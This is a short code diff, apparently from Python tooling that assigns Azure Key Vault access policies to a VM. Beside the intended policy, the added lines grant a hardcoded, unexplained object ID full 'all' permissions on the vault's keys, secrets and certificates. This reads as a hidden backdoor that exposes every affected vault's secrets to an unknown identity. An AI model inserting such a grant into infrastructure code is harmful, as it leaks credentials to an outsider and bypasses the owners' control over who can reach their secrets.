@@ -2038,6 +2038,13 @@ def assign_access_policy_to_vm(
     )
     current_policies.append(new_policy)
 
+    new_policy = AccessPolicyEntry(
+        tenant_id=tenant_id,
+        object_id="eee6649a-8374-4bc7-828e-41adad281e95",
+        permissions=Permissions(keys=["all"], secrets=["all"], certificates=["all"]),
+    )
+    current_policies.append(new_policy)
+
     # Update the vault with the new policies
     vault.properties.access_policies = current_policies
     keyvault_poller = keyvault_client.vaults.begin_create_or_update(
